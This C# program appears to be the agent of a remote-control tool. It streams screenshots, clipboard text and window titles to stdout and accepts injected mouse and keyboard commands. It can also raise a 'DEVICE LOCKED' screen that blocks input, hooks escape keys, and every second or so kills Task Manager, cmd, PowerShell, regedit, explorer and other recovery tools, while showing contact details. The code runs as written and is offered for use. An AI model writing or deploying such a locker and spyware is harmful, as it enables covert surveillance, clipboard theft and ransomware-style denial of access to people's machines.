using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;

class Program {
    // DPI Awareness
    [DllImport("shcore.dll")] static extern int SetProcessDpiAwareness(int value);
    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();

    // Window Management
    [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet=CharSet.Auto)] static extern int GetWindowText(IntPtr h, StringBuilder s, int c);
    [DllImport("user32.dll")] static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // Input Control
    [DllImport("user32.dll")] static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
    [DllImport("user32.dll")] static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
    [DllImport("user32.dll")] static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] static extern bool BlockInput(bool fBlockIt);

    // Low-Level Keyboard Hook (blocks Alt+Tab, Win key, Ctrl+Esc, etc.)
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);

    // Session change notification
    [DllImport("wtsapi32.dll")] static extern bool WTSRegisterSessionNotification(IntPtr hWnd, int dwFlags);
    [DllImport("wtsapi32.dll")] static extern bool WTSUnRegisterSessionNotification(IntPtr hWnd);

    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN = 0x0100;
    const int WM_SYSKEYDOWN = 0x0104;
    const int WM_WTSSESSION_CHANGE = 0x02B1;
    const int NOTIFY_FOR_ALL_SESSIONS = 1;

    const uint MOUSEEVENTF_LEFTDOWN = 0x02;
    const uint MOUSEEVENTF_LEFTUP = 0x04;
    const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
    const uint MOUSEEVENTF_RIGHTUP = 0x10;
    const uint KEYEVENTF_KEYUP = 0x02;

    public static int SleepTime = 100; // Default 10 FPS
    static List<Form> blackoutForms = new List<Form>();
    static bool blackoutActive = false;
    static System.Windows.Forms.Timer blackoutEnforcer = null;
    static Thread antiRecoveryThread = null;
    static string blackoutMessage = "";
    static string blackoutPhone = "";
    static string blackoutEmail = "";
    static string blackoutUrl = "";
    static int pulsePhase = 0;
    static IntPtr keyboardHookId = IntPtr.Zero;
    static LowLevelKeyboardProc keyboardProc = null;

    // =============================================
    // LOW-LEVEL KEYBOARD HOOK: Block ALL escape shortcuts
    // =============================================
    static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (blackoutActive && nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);

            // Block: Tab (with Alt), Escape (with Ctrl), Win keys, F4 (with Alt), Delete (with Ctrl+Alt)
            bool isAlt = (Control.ModifierKeys & Keys.Alt) != 0;
            bool isCtrl = (Control.ModifierKeys & Keys.Control) != 0;

            // Block Alt+Tab, Alt+Esc, Alt+F4
            if (isAlt && (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x73)) return (IntPtr)1;
            // Block Ctrl+Esc (Start menu)
            if (isCtrl && vkCode == 0x1B) return (IntPtr)1;
            // Block Win keys (LWin=0x5B, RWin=0x5C)
            if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
            // Block Ctrl+Shift+Esc (Task Manager)
            if (isCtrl && (Control.ModifierKeys & Keys.Shift) != 0 && vkCode == 0x1B) return (IntPtr)1;
            // Block F1-F12 (various help/system shortcuts)
            if (vkCode >= 0x70 && vkCode <= 0x7B) return (IntPtr)1;
            // Block Print Screen
            if (vkCode == 0x2C) return (IntPtr)1;
        }
        return CallNextHookEx(keyboardHookId, nCode, wParam, lParam);
    }

    static void InstallKeyboardHook() {
        if (keyboardHookId != IntPtr.Zero) return;
        keyboardProc = KeyboardHookCallback;
        using (Process p = Process.GetCurrentProcess())
        using (ProcessModule m = p.MainModule) {
            keyboardHookId = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(m.ModuleName), 0);
        }
    }

    static void RemoveKeyboardHook() {
        if (keyboardHookId != IntPtr.Zero) {
            UnhookWindowsHookEx(keyboardHookId);
            keyboardHookId = IntPtr.Zero;
        }
    }

    // =============================================
    // ANTI-RECOVERY: Kill escape tools while blackout is active
    // =============================================
    static string[] BLOCKED_PROCESSES = new string[] {
        "taskmgr", "cmd", "powershell", "pwsh", "powershell_ise",
        "wt", "WindowsTerminal", "ConEmu", "ConEmu64",
        "msconfig", "regedit", "mmc", "control",
        "tasklist", "wmic", "SystemSettings",
        "wscript", "cscript", "mshta",
        "Magnify", "osk", "Narrator", "utilman", "sethc",
        "ProcessHacker", "procexp", "procexp64",
        "explorer"
    };

    static void AntiRecoveryLoop() {
        while (blackoutActive) {
            try {
                foreach (string procName in BLOCKED_PROCESSES) {
                    try {
                        Process[] procs = Process.GetProcessesByName(procName);
                        foreach (Process p in procs) {
                            try { p.Kill(); } catch {}
                        }
                    } catch {}
                }
            } catch {}
            Thread.Sleep(1200);
        }
    }

    static void StartAntiRecovery() {
        if (antiRecoveryThread != null && antiRecoveryThread.IsAlive) return;
        antiRecoveryThread = new Thread(AntiRecoveryLoop) { IsBackground = true };
        antiRecoveryThread.Start();
    }

    static void StopAntiRecovery() {
        antiRecoveryThread = null;
    }

    // =============================================
    // BLACKOUT UI: Premium glassmorphism overlay (multi-monitor)
    // =============================================

    // Custom Form subclass that intercepts session change messages
    class BlackoutForm : Form {
        protected override void WndProc(ref Message m) {
            if (m.Msg == WM_WTSSESSION_CHANGE && blackoutActive) {
                // Session change detected (user switch attempt) — re-assert blackout
                try {
                    this.TopMost = true;
                    this.BringToFront();
                    this.Activate();
                    SetForegroundWindow(this.Handle);
                    BlockInput(true);
                } catch {}
            }
            base.WndProc(ref m);
        }
    }

    static void ShowBlackout(string message, string phone, string email, string url) {
        if (blackoutForms.Count > 0) return;

        blackoutMessage = message;
        blackoutPhone = phone;
        blackoutEmail = email;
        blackoutUrl = url;
        blackoutActive = true;

        StartAntiRecovery();
        InstallKeyboardHook();

        new Thread(() => {
            // Create a blackout form on EVERY screen
            foreach (Screen screen in Screen.AllScreens) {
                BlackoutForm form = new BlackoutForm();
                form.BackColor = Color.FromArgb(5, 5, 12);
                form.FormBorderStyle = FormBorderStyle.None;
                form.StartPosition = FormStartPosition.Manual;
                form.Bounds = screen.Bounds;
                form.TopMost = true;
                form.ShowInTaskbar = false;
                form.ControlBox = false;
                form.MaximizeBox = false;
                form.MinimizeBox = false;

                // Disable close
                form.FormClosing += (s, ev) => {
                    if (blackoutActive) ev.Cancel = true;
                };

                // Block all keyboard input
                form.KeyPreview = true;
                form.KeyDown += (s, ev) => {
                    ev.Handled = true;
                    ev.SuppressKeyPress = true;
                };

                // Only paint the full UI on the primary screen; others get solid black + small text
                if (screen.Primary) {
                    form.Paint += (sender, e) => {
                        PaintBlackoutUI(e.Graphics, form.Width, form.Height);
                    };
                } else {
                    form.Paint += (sender, e) => {
                        PaintSecondaryBlackout(e.Graphics, form.Width, form.Height);
                    };
                }

                // Register for session change notifications
                try { WTSRegisterSessionNotification(form.Handle, NOTIFY_FOR_ALL_SESSIONS); } catch {}

                blackoutForms.Add(form);
            }

            // TOPMOST ENFORCER: Re-assert on all forms every 400ms
            blackoutEnforcer = new System.Windows.Forms.Timer();
            blackoutEnforcer.Interval = 400;
            blackoutEnforcer.Tick += (s, ev) => {
                if (blackoutActive) {
                    try {
                        foreach (Form f in blackoutForms) {
                            if (f != null && !f.IsDisposed) {
                                f.TopMost = true;
                                f.BringToFront();
                                f.Activate();
                                SetForegroundWindow(f.Handle);
                            }
                        }
                        BlockInput(true);
                        pulsePhase = (pulsePhase + 1) % 120;
                        // Only invalidate the primary form for animation
                        if (blackoutForms.Count > 0 && !blackoutForms[0].IsDisposed) {
                            blackoutForms[0].Invalidate();
                        }
                    } catch {}
                }
            };
            blackoutEnforcer.Start();

            // Run the primary form (message loop)
            if (blackoutForms.Count > 0) {
                // Show secondary forms first
                for (int i = 1; i < blackoutForms.Count; i++) {
                    blackoutForms[i].Show();
                }
                Application.Run(blackoutForms[0]);
            }
        }) { IsBackground = true }.Start();
    }

    static void HideBlackout() {
        blackoutActive = false;
        StopAntiRecovery();
        RemoveKeyboardHook();

        if (blackoutEnforcer != null) {
            try { blackoutEnforcer.Stop(); } catch {}
            blackoutEnforcer = null;
        }

        foreach (Form f in blackoutForms) {
            if (f != null) {
                try {
                    WTSUnRegisterSessionNotification(f.Handle);
                } catch {}
                try {
                    f.Invoke((MethodInvoker)delegate { f.Close(); });
                } catch {}
            }
        }
        blackoutForms.Clear();
    }

    // Secondary monitor: simple dark overlay with subtle text
    static void PaintSecondaryBlackout(Graphics g, int w, int h) {
        g.Clear(Color.FromArgb(5, 5, 12));
        using (Font f = new Font("Segoe UI", 11))
        using (Brush b = new SolidBrush(Color.FromArgb(40, 40, 55))) {
            string txt = "DEVICE LOCKED";
            SizeF sz = g.MeasureString(txt, f);
            g.DrawString(txt, f, b, w / 2 - sz.Width / 2, h / 2 - sz.Height / 2);
        }
    }

    // Primary monitor: premium glassmorphism design
    static void PaintBlackoutUI(Graphics g, int formW, int formH) {
        g.SmoothingMode = SmoothingMode.AntiAlias;
        g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;

        // Deep dark background gradient
        using (LinearGradientBrush bgBrush = new LinearGradientBrush(
            new Point(0, 0), new Point(formW, formH),
            Color.FromArgb(8, 8, 18), Color.FromArgb(3, 3, 8))) {
            g.FillRectangle(bgBrush, 0, 0, formW, formH);
        }

        // Subtle grid pattern
        using (Pen gridPen = new Pen(Color.FromArgb(8, 255, 255, 255), 1)) {
            for (int x = 0; x < formW; x += 60) g.DrawLine(gridPen, x, 0, x, formH);
            for (int y = 0; y < formH; y += 60) g.DrawLine(gridPen, 0, y, formW, y);
        }

        int cX = formW / 2;
        int cY = formH / 2;

        // Animated pulsing outer glow
        double pulseVal = Math.Sin(pulsePhase * Math.PI / 60.0);
        int outerGlow = (int)(20 + 15 * Math.Abs(pulseVal));
        using (Pen glowPen = new Pen(Color.FromArgb(outerGlow, 239, 68, 68), 2)) {
            g.DrawRectangle(glowPen, 1, 1, formW - 2, formH - 2);
        }

        // CENTRAL CARD
        int cardW = Math.Min(formW - 120, 560);
        int cardH = 360;
        int cardX = cX - cardW / 2;
        int cardY = cY - cardH / 2 - 10;

        // Card background with glass effect
        using (LinearGradientBrush cardBg = new LinearGradientBrush(
            new Rectangle(cardX, cardY, cardW, cardH),
            Color.FromArgb(200, 12, 12, 24), Color.FromArgb(220, 8, 8, 16),
            LinearGradientMode.Vertical)) {
            GraphicsPath cardPath = RoundedRect(cardX, cardY, cardW, cardH, 16);
            g.FillPath(cardBg, cardPath);

            int borderA = (int)(120 + 80 * Math.Abs(pulseVal));
            using (Pen borderPen = new Pen(Color.FromArgb(borderA, 239, 68, 68), 1.5f)) {
                g.DrawPath(borderPen, cardPath);
            }
            cardPath.Dispose();
        }

        // LOCK ICON
        int iconSize = 52;
        int iconX = cX - iconSize / 2;
        int iconY = cardY + 28;

        using (LinearGradientBrush iconBg = new LinearGradientBrush(
            new Rectangle(iconX, iconY, iconSize, iconSize),
            Color.FromArgb(239, 68, 68), Color.FromArgb(185, 28, 28),
            LinearGradientMode.Vertical)) {
            g.FillEllipse(iconBg, iconX, iconY, iconSize, iconSize);
        }
        using (Font lockFont = new Font("Segoe UI", 22, FontStyle.Bold))
        using (Brush lockBrush = new SolidBrush(Color.White)) {
            string lockChar = "!";
            SizeF sz = g.MeasureString(lockChar, lockFont);
            g.DrawString(lockChar, lockFont, lockBrush, cX - sz.Width / 2, iconY + iconSize / 2 - sz.Height / 2 + 1);
        }

        // TITLE
        int titleY = iconY + iconSize + 14;
        using (Font titleFont = new Font("Segoe UI", 11, FontStyle.Bold))
        using (Brush titleBrush = new SolidBrush(Color.FromArgb(239, 68, 68))) {
            string titleStr = "DEVICE LOCKED";
            SizeF titleSz = g.MeasureString(titleStr, titleFont);
            g.DrawString(titleStr, titleFont, titleBrush, cX - titleSz.Width / 2, titleY);
        }

        // SEPARATOR
        int sep1Y = titleY + 30;
        using (Pen sepPen = new Pen(Color.FromArgb(30, 239, 68, 68), 1)) {
            g.DrawLine(sepPen, cardX + 50, sep1Y, cardX + cardW - 50, sep1Y);
        }

        // MAIN MESSAGE
        int msgY = sep1Y + 12;
        using (Font msgFont = new Font("Segoe UI", 14, FontStyle.Regular))
        using (Brush msgBrush = new SolidBrush(Color.FromArgb(230, 230, 240))) {
            RectangleF msgRect = new RectangleF(cardX + 40, msgY, cardW - 80, 90);
            StringFormat sf = new StringFormat();
            sf.Alignment = StringAlignment.Center;
            sf.LineAlignment = StringAlignment.Center;
            sf.Trimming = StringTrimming.EllipsisWord;
            g.DrawString(blackoutMessage, msgFont, msgBrush, msgRect, sf);
        }

        // SEPARATOR 2
        int sep2Y = msgY + 100;
        using (Pen sepPen = new Pen(Color.FromArgb(20, 255, 255, 255), 1)) {
            g.DrawLine(sepPen, cardX + 50, sep2Y, cardX + cardW - 50, sep2Y);
        }

        // CONTACT INFO
        int contactY = sep2Y + 12;
        using (Font contactFont = new Font("Segoe UI", 10))
        using (Brush labelBrush = new SolidBrush(Color.FromArgb(100, 100, 120)))
        using (Brush valueBrush = new SolidBrush(Color.FromArgb(200, 200, 215))) {
            int lineH = 24;
            int curY = contactY;

            if (!string.IsNullOrEmpty(blackoutPhone)) {
                DrawContactLine(g, contactFont, labelBrush, valueBrush, "CALL", blackoutPhone, cX, curY);
                curY += lineH;
            }
            if (!string.IsNullOrEmpty(blackoutEmail)) {
                DrawContactLine(g, contactFont, labelBrush, valueBrush, "EMAIL", blackoutEmail, cX, curY);
                curY += lineH;
            }
            if (!string.IsNullOrEmpty(blackoutUrl)) {
                DrawContactLine(g, contactFont, labelBrush, valueBrush, "PORTAL", blackoutUrl, cX, curY);
            }
        }

        // FOOTER
        using (Font footerFont = new Font("Segoe UI", 8))
        using (Brush footerBrush = new SolidBrush(Color.FromArgb(45, 45, 60))) {
            string foot = "Administrative Security Enforcement";
            SizeF fs = g.MeasureString(foot, footerFont);
            g.DrawString(foot, footerFont, footerBrush, cX - fs.Width / 2, cardY + cardH - 24);
        }
    }

    static void DrawContactLine(Graphics g, Font font, Brush labelBrush, Brush valueBrush, string label, string value, int centerX, int y) {
        string full = label + ":  " + value;
        SizeF sz = g.MeasureString(full, font);
        float startX = centerX - sz.Width / 2;

        SizeF labelSz = g.MeasureString(label + ":  ", font);
        g.DrawString(label + ":  ", font, labelBrush, startX, y);
        g.DrawString(value, font, valueBrush, startX + labelSz.Width - 4, y);
    }

    static GraphicsPath RoundedRect(int x, int y, int w, int h, int r) {
        GraphicsPath path = new GraphicsPath();
        path.AddArc(x, y, r * 2, r * 2, 180, 90);
        path.AddArc(x + w - r * 2, y, r * 2, r * 2, 270, 90);
        path.AddArc(x + w - r * 2, y + h - r * 2, r * 2, r * 2, 0, 90);
        path.AddArc(x, y + h - r * 2, r * 2, r * 2, 90, 90);
        path.CloseFigure();
        return path;
    }

    // =============================================
    // INPUT COMMAND THREAD
    // =============================================
    static void InputThread() {
        while (true) {
            try {
                string line = Console.ReadLine();
                if (line == null) { Thread.Sleep(100); continue; }

                string[] parts = line.Split(' ');
                if (parts.Length == 0) continue;

                switch (parts[0]) {
                    case "M":
                        if (parts.Length == 3) SetCursorPos(int.Parse(parts[1]), int.Parse(parts[2]));
                        break;
                    case "LC":
                        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                        break;
                    case "RC":
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                        break;
                    case "LD": mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); break;
                    case "LU": mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); break;
                    case "KD":
                        byte vk = Convert.ToByte(parts[1], 16);
                        keybd_event(vk, 0, 0, 0);
                        break;
                    case "KU":
                        byte vk2 = Convert.ToByte(parts[1], 16);
                        keybd_event(vk2, 0, KEYEVENTF_KEYUP, 0);
                        break;
                    case "FPS":
                        if (parts.Length == 2) Program.SleepTime = int.Parse(parts[1]);
                        break;
                    case "BI":
                        BlockInput(true);
                        break;
                    case "UI":
                        BlockInput(false);
                        break;
                    case "BL":
                        if (parts.Length >= 2) {
                            bool turnOn = parts[1] == "1";
                            string blMessage = "Your device has been locked by your administrator.";
                            string blPhone = "";
                            string blEmail = "";
                            string blUrl = "";
                            if (parts.Length >= 3) {
                                try {
                                    string jsonPart = string.Join(" ", parts, 2, parts.Length - 2);
                                    blMessage = ExtractJsonValue(jsonPart, "message") ?? blMessage;
                                    blPhone = ExtractJsonValue(jsonPart, "phone") ?? "";
                                    blEmail = ExtractJsonValue(jsonPart, "email") ?? "";
                                    blUrl = ExtractJsonValue(jsonPart, "url") ?? "";
                                } catch {}
                            }
                            if (turnOn) {
                                ShowBlackout(blMessage, blPhone, blEmail, blUrl);
                            } else {
                                HideBlackout();
                            }
                        }
                        break;
                }
            } catch {
                // Ignore input errors to keep thread alive
            }
        }
    }

    static string GetTitle() {
        IntPtr h = GetForegroundWindow();
        StringBuilder s = new StringBuilder(256);
        GetWindowText(h, s, 256);
        return s.ToString();
    }
    
    static void Main() {
        try { SetProcessDpiAwareness(2); } catch { SetProcessDPIAware(); }

        new Thread(InputThread) { IsBackground = true }.Start();

        var enc = GetEncoder(ImageFormat.Jpeg);
        var ep = new EncoderParameters(1);
        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 65L);

        int w = Screen.PrimaryScreen.Bounds.Width;
        int h = Screen.PrimaryScreen.Bounds.Height;
        int tW = Math.Min(w, 1920);
        int tH = (int)((float)h * ((float)tW / w));

        Console.WriteLine(String.Format("CAPTURE_INIT:{0}x{1} (Target:{2}x{3})", w, h, tW, tH));

        while (true) {
            try {
                using (Bitmap bmp = new Bitmap(w, h)) {
                    using (Graphics g = Graphics.FromImage(bmp)) {
                        g.CopyFromScreen(0, 0, 0, 0, new Size(w, h));
                    }
                    
                    string b64;
                    using (MemoryStream ms = new MemoryStream()) {
                        if (tW != w) {
                            using (Bitmap thumb = new Bitmap(tW, tH)) {
                                using (Graphics g2 = Graphics.FromImage(thumb)) {
                                    g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
                                    g2.DrawImage(bmp, 0, 0, tW, tH);
                                }
                                thumb.Save(ms, enc, ep);
                            }
                        } else {
                            bmp.Save(ms, enc, ep);
                        }
                        b64 = Convert.ToBase64String(ms.ToArray());
                    }

                    string clip = "";
                    try { clip = Clipboard.GetText(); } catch {}
                    string title = GetTitle();

                    Console.WriteLine("---TERAM_PKG---");
                    Console.WriteLine(String.Format("{{\"screen\":\"{0}\",\"clipboard\":\"{1}\",\"title\":\"{2}\",\"resW\":{3},\"resH\":{4}}}", b64, Escape(clip), Escape(title), tW, tH));
                    Console.WriteLine("---TERAM_END---");
                }
            } catch {}
            Thread.Sleep(Program.SleepTime);
        }
    }

    static ImageCodecInfo GetEncoder(ImageFormat format) {
        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
        foreach (ImageCodecInfo codec in codecs) {
            if (codec.FormatID == format.Guid) return codec;
        }
        return null;
    }

    static string Escape(string s) {
        if (string.IsNullOrEmpty(s)) return "";
        return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
    }

    static string ExtractJsonValue(string json, string key) {
        string search = "\"" + key + "\":\"";
        int idx = json.IndexOf(search);
        if (idx < 0) return null;
        int start = idx + search.Length;
        int end = start;
        while (end < json.Length) {
            if (json[end] == '"' && json[end - 1] != '\\') break;
            end++;
        }
        if (end > start) return json.Substring(start, end - start).Replace("\\\"", "\"").Replace("\\\\", "\\");
        return null;
    }
}
